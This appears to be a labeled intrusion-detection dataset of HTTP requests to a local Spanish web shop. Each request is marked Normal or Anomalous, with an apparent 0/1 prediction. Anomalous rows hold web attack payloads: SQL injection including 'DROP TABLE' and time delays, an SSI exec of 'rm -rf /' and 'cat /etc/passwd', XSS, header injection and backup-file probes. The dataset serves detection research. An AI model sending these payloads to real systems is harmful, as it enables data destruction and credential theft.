Normal 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=michiel&password=apolilladura&nombre=Ken&apellidos=Corts&email=rozsabegyi.kasker%40mirata.ls&dni=70243797A&direccion=Grupos+1+y+2+Valladolid+178%2C+&ciudad=Robledollano&cp=34309&provincia=Valladolid&ntc=7375761313849079&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/global/estilos.css/asf-logo-wide.gif/ HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8673&B1=Pasar+por+caja HTTP/1.1
Anomalous 1 POST id=1%2F&nombre=Vino+Rioja&precio=39&cantidad=75&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 POST modo=entrar&login=ianace&pwd=ALfarDiLla&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=65&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/6909030637832563290.jsp.Bak HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 POST id=3%22+AND+%221%22%3D%221&nombre=Vino+Rioja&precio=39&cantidad=46&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Normal 0 POST modo=insertar&precio=8547&B1=Pasar+por+caja http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Normal 0 POST modo=registro&login=ohn&password=trastabill%F3n&nombre=Wilfredo&apellidos=Pojmaevich+Tissera&email=pager%40cocheacoche.ws&dni=48099287P&direccion=C%2F+De+Los+Torneros%2C+5+2%3FC&ciudad=Manacor&cp=21510&provincia=Salamanca&ntc=2420548941226708&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Anomalous 1 POST modo=entrar&loginA=dion&pwd=tric%F3tomo&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mundy&pwd=alat%F3n&remember=on&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
Normal 0 POST id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Anomalous 1 POST modo=registro&login=dal%27li&password=4107nD%E1&nombre=Shunko&apellidos=Brio+Bertorelli&email=griffen7%40docerosas.no&dni=71766334D&direccion=Calle+Gitanillos+De+Cadiz+96+2%3FH&ciudad=Cala%F1as&cp=24234&provincia=Palencia&ntc=5502025847715337&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 POST modo=registro&login=hurwitz&password=P7rdUlarIo&nombre=Yasmila&apellidos=Raquer+De+la+Poza&email=kober%40sindns.ve&dni=24117332S&direccion=Calle+Barri+Trinitat+Nova%2C+S%2FN%2C+13D&ciudad=Parra+de+las+Vegas%2C+La&cp=12709&provincia=Z%2Bam.%2Bora&ntc=1828745224462815&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/asf-logo-wide.gif/ HTTP/1.1
Anomalous 1 GET  http://localhost:8080/samples/gbook/register.htm HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hartmann&password=al55nza&nombre=Randolfo&apellidos=Rovirola+Noiran&email=lorre-d%40uell2%40simulacion-credito.ma&dni=73500117Y&direccion=Pl.+Aranjuez%2C+S%2FN+&ciudad=Sobremunt&cp=18127&provincia=Tarragona&ntc=1198702099336688&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1.INC HTTP/1.1
Anomalous 1 POST modo=registro&login=hantak&password=t82925r&nombre=Lihue&apellidos=Coev+Carles&email=holzschuh7%40superlinks.ga&dni=60956471P&direccion=Fuenterrabia+130+2F&ciudad=Palacios+de+Sanabria&cp=48498&provincia=Barcelona&ntc=6136393758401812&B1=Registrar%7C http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.Old HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 POST B2=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%7C HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/index.jsp.BAK HTTP/1.1
Anomalous 1 GET  http://localhost:8080/iisadmpwd/achg.htr HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bisad&password=c9r1ne75&nombre=Gaetano&apellidos=Cuellar+Reino&email=iwasaki%40chaqueta.com.asia&dni=36839675T&direccion=Praza+Francisco+Fernandez+Del+Riego%2C+131+&ciudad=Puente+la+Reina%2FGares&cp=25330&provincia=Baleares+%28Illes%29&ntc=0455475530257708&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/imagenes/6909030637832563290.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=66&B1A=A%F1adir+al+carrito HTTP/1.1
Normal 0 POST modo=entrar&login=reamonn&pwd=mud6787t6&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/imagenes~ HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=514&B1A=Pasar+por+caja HTTP/1.1
Normal 1 POST id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=37&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/servlet/HelloWorldServlet HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hoggatt&pwd=indoct9me7te&remember=off&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4110&B1A=Confirmar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27INJECTED_PARAM HTTP/1.1
Normal 1 POST modo=registro&login=siana&password=GA%2BVaNza&nombre=Juana&apellidos=Quijano&email=folsom_talli%40esteticadayda.tel&dni=52943030C&direccion=Santa+Catalina+81+&ciudad=Pla+del+Pened%E8s%2C+El&cp=16646&provincia=Girona&ntc=8510133826812144&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous 1 POST id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/6909030637832563290.jsp.inc HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pistilli&password=PErVErTIMieNto&nombre=Delfo&apellidos=Berzoni+Arzaluz&emailA=starkey%40mcfly.kg&dni=29973823Q&direccion=Calle+Alacant+165+6-B&ciudad=Cabez%F3n+de+Cameros&cp=28691&provincia=Teruel&ntc=7673189630192545&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eriks&pwd=salSa&rememberA=off&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frasco&pwd=.ag091766so&remember=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=95&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous 1 POST modo=entrar&login=basi%2Cl&pwd=9725i34o3&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/ HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maitland&password=po29ip1t0l6&nombre=Farhan&apellidos=Chutas&email=roco%40forohh.ge&dni=34708532Z&direccion=Cami+Can+Rabella%2C+S%2FN+&ciudad=Molinos+de+Duero&cp=33527&provincia=Burgos&ntc=1616372290500917&B1=Registrar HTTP/1.1
Normal 0 POST modo=insertar&precio=7173&B1=Confirmar http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=info-man5%27+AND+%271%27%3D%271&pwd=franqueable&remember=on&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alisande6&password=aviadoraany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Rosendo&apellidos=Schulz+De+Buran&email=geldart5%40corjet.hk&dni=10019031R&direccion=Travesia+Sacrificio+111%2C+7-E&ciudad=Font+d%27En+Carr%F2s%2C+la&cp=26584&provincia=Albacete&ntc=0497967469696167&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Anomalous 0 POST modo=entrar&login=seyfolla&pwd=c85o%277rer6&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1972&B1=Pasar+por+caja%2F HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9ricoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=6&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=loria&password=bu0ar4&nombre=Otilio&apellidos=Castelan+Iznaga&email=buchel-alymer%40gemas.org.bu&dni=72620654V&direccion=Plza.+Nuevo+Mundo%2C+119%2C+4-D&ciudad=Valleseco&cp=10960&provincia=Salamanca&ntc=3709256796210266&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 POST errorMsg=Credenciales+incorrectas http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 POST modo=registro&login=sheree&password=baladOra&nombre=Atos&apellidos=Mat%F3+Farriols&email=pierfederici%40softstylestudio.ls&dni=24797673Q&direccion=Reinosa+98%2C+13-E&ciudad=Geria&cp=34120&provincia=Girona&ntc=5515498437464021&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=%2520&remember=on&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kh%27ez%3Fri&password=2ic15&nombre=Amando&apellidos=Mompart+Anglaril&email=parente%40espaciopintor.ro&dni=65049815L&direccion=Plza.+Pablo+Picasso+198+4-C&ciudad=Villamoronta&cp=03517&provincia=Teruel&ntc=8000827068875110&B1=Registrar HTTP/1.1
Anomalous 1 POST modo=registro&login=han-fei&password=esPUeNdA&nombre=%3FBa.s-iana&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080.Bak HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
Normal 1 POST id=3&nombre=Vino+Rioja&precio=100&cantidad=17&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=krausbar&password=126i46ca79%F3n&nombre=Isa%FAl&apellidos=Coev+Carles&email=jeaves%40redhost.aero&dni=27708977A&direccion=Cervera+46+13-H&ciudad=Solivella&cp=47691&provincia=Barcelona&ntc=2980660510325529&B1=Registrar HTTP/1.1
Normal 0 POST modo=insertar&precio=7361&B1=Confirmar http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mayi&password=r75ar&nombre=Alenka&apellidos=Cejas+Torra&email=kobe%40techdata.com.pg&dni=75925253E&direccion=%27INJECTED_PARAM&ciudad=Torres+de+Cotillas%2C+Las&cp=08731&provincia=Navarra&ntc=1803474685764017&B1=Registrar HTTP/1.1
Normal 1 POST modo=registro&login=milford1&password=maTizAr&nombre=Roxette&apellidos=Vargas+Bentos&email=gaubert%40clementelr.mw&dni=97649797P&direccion=Calle+Neptuno+162%2C+&ciudad=R%F3denas&cp=42127&provincia=La+Rioja&ntc=0904159527442646&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 POST modo=registro&login=amant&password=coyotera&nombre=Aleardo&apellidos=Sellares+Brihuega&email=miguel_bridge%40irmedia.nl&dni=15074727K&direccion=Calle+Rodrigo+De+Triana+189%2C+6E&ciudad=Ametlla+del+Vall%E8s%2C+L%27&cpA=44597&provincia=Guadalajara&ntc=2988316222731904&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 POST errorMsg=Credenciales+incorrectas%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/carrito.jsp.old HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tapani9&password=ep9scopologio&nombre=Seliem&apellidos=Crous+Zuta&email=kappeler-flick%40probandoo.mobi&dni=82444604T&direccion=Calle+Capitan+Palacios+71+&ciudad=Laguna+del+Marquesado&cp=12449&provincia=La+Rioja&ntc=1595247568175334&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Anomalous 1 POST errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 POST modo=entrar&login=guillory&pwd=Arme%21LlUElA&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8345&B1=Confirmar%2F HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27OR%27a%3D%27a&B1=Confirmar HTTP/1.1
Normal 0 POST modo=registro&login=bi-jun&password=u%2B6711n&nombre=Vital&apellidos=Sanzana&email=fechner_rabel%40fortelingenieria.sd&dni=30731993Z&direccion=Calle+300+Al+8+Del+Km.+1+Puesta+En+Riego+144%2C+&ciudad=Rabanera&cp=28529&provincia=Ciudad+Real&ntc=8112463207764255&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 POST modo=insertar&precio=9353&B1=Pasar+por+caja%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hanny&pwd=c4nt0r%F3N&remember=on&B1=Entrar HTTP/1.1
Normal 1 POST modo=registro&login=sidonia&password=reele.cto&nombre=Amalio&apellidos=Izurrieta+Pomales&email=railey%40g-audio.ic&dni=99999464H&direccion=C%2F+Pe%F1iscola%2C+95+3%3FG&ciudad=Oluges%2C+Les&cp=50700&provincia=Ciudad+Real&ntc=5118232940986144&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Normal 0 POST modo=entrar&login=tris2&pwd=2epullo&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=furuta&password=f3ci0e0368&nombre=Yohana&apellidos=Lladonosa+Uchuya&email=starrelt-stafford%40ajedrezconmaestros.sa&dni=41407341G&direccionA=Camarotes%2C+144%2C+&ciudad=Salares&cp=37216&provincia=Valladolid&ntc=8395637658753936&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Anomalous 0 POST errorMsg=Credenciales+incorrectas%4040 http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8036&B1=Pasar+por+caja%2F HTTP/1.1
Anomalous 1 POST modo=registro&login=linni&password=892444a9aci8&nombre=Rosario&apellidos=Bagudanc+Robles&email=haumann%40maxiwagen.tj&dni=72278943V&direccion=C%2F+Santa+Beatriz+104%2C+8D&ciudadA=Mingorr%EDa&cp=42173&provincia=Palencia&ntc=8723970834822268&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%3Fgols*h%2Can&password=contrAamura&nombre=Nicasia&apellidos=Coyoma+Abia&email=padovani%40thequeenworm.mp&dni=78419891B&direccion=Avenida+Castilla-la+Mancha+187%2C+3-D&ciudad=Sagrada%2C+La&cp=09318&provincia=A+Coru%F1a&ntc=4808153993761167&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 POST id=2&nombre=%2520&precio=85&cantidad=23&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Normal 0 POST id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 1 POST modo=entrar&login=di_cosol&pwd=aM24%2CI6%2F99i%271&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
Anomalous 1 POST idA=2&nombre=Vino+Rioja&precio=39&cantidad=1&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous 1 POST modo=insertar&precio=8588&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=austen&password=menegilda&nombre=Marcia&apellidos=Castelltort+Trullol&email=tomchat%40enhierro.com.tc&dni=74819294H&direccion=Guadalete+90%2C+&ciudad=Porto&cp=10616&provincia=Segovia&ntc=122001210606787&B1=Registrar HTTP/1.1
